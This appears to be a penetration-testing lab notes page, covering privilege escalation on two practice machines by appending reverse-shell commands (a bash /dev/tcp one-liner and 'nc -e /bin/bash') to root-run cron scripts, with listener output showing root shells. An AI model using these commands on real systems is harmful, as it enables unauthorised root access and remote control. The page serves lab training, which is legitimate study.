---
layout: default
title: Writable Script
parent: Cron
nav_order: 2
---

# Writable Script

---

## /bin/bash Reverse Shell

Enumerate user _funny_ home directory and locate a _.backup.sh_ that is creating a backup of _/var/www/html_ every 1 minute.

```bash
joe@funbox:/home/funny$ ls -la
ls -la
total 47592
drwxr-xr-x 3 funny funny     4096 Aug 21  2020 .
drwxr-xr-x 4 root  root      4096 Jun 19  2020 ..
-rwxrwxrwx 1 funny funny       55 Aug 21  2020 .backup.sh
lrwxrwxrwx 1 funny funny        9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 funny funny      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 funny funny     3771 Feb 25  2020 .bashrc
drwx------ 2 funny funny     4096 Jun 19  2020 .cache
-rw-rw-r-- 1 funny funny 48701440 Nov 16 03:36 html.tar
-rw-r--r-- 1 funny funny      807 Feb 25  2020 .profile
-rw-rw-r-- 1 funny funny      162 Jun 19  2020 .reminder.sh
joe@funbox:/home/funny$ cat .backup.sh
cat .backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html

```

_.backup.sh_ is world writeable so we can edit this script to give us a reverse shell as _root_ user.

```bash
joe@funbox:/home/funny$ echo '/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1' >> .backup.sh
echo '/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1' >> .backup.sh
joe@funbox:/home/funny$ cat .backup.sh
cat .backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
/bin/bash -i >& /dev/tcp/192.168.45.217/9002 0>&1
```

After a couple minutes we get a reverse shell as _root_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.77] 41312
bash: cannot set terminal process group (4896): Inappropriate ioctl for device
bash: no job control in this shell
root@funbox:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@funbox:~# whoami
whoami
root
root@funbox:~# cat /root/proof.txt
cat /root/proof.txt
3d96************************
```

## Netcat Reverse Shell

The script _.trash_old_ should execute with root permissions.

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Nov 18 22:03 .
drwxr-xr-x 5 penguin penguin   4096 Nov 18 21:59 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       662 Nov 18 22:03 .trash_old
-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt

```

Assuming this is probably being executed by _root_ on a cron job, let's edit and add a command that creates a _rootbash_ script with root privileges.

```bash
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

nc -e /bin/bash 192.168.45.217 9001

exit 0


```

After a minute we get a reverse shell as root

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.202.79] 37926
whoami
root

```
